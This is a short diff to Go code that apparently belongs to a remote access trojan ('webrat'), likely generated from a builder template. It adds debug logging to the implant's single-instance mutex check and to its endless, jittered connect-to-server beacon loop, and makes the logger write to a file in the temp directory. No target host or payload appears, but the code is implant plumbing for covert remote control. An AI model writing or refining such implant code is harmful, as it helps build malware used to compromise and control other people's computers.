@@ -79,17 +79,22 @@ func shouldEnforceBuildLock() bool {
 }
 
 func loopA() {
+	log.Println("[loopA] entered, mutexName=", getMutexName())
 	mutex, err := acquireMutex(getMutexName())
 	if err != nil {
+		log.Println("[loopA] acquireMutex FAILED:", err, "-> returning")
 		return
 	}
 	defer windows.CloseHandle(mutex)
+	log.Println("[loopA] mutex acquired, entering connect loop")
 
 	rand.Seed(time.Now().UnixNano())
 
-	for {
+	for i := 0; ; i++ {
+		log.Println("[loopA] connectToServer attempt #", i)
 		connectToServer()
 		jitter := 5 + rand.Intn(11)
+		log.Println("[loopA] sleeping", jitter, "seconds before retry")
 		time.Sleep(time.Duration(jitter) * time.Second)
 	}
 }
@@ -440,6 +445,15 @@ func checkProcessRunning(processName string) bool {
 	return false
 }
 
-func setupLogger() *os.File { return nil }
+func setupLogger() *os.File {
+	logPath := filepath.Join(os.TempDir(), "webrat_debug.log")
+	f, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		return nil
+	}
+	log.SetOutput(f)
+	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds)
+	return f
+}
 `, delay, buildID, buildID))
 }
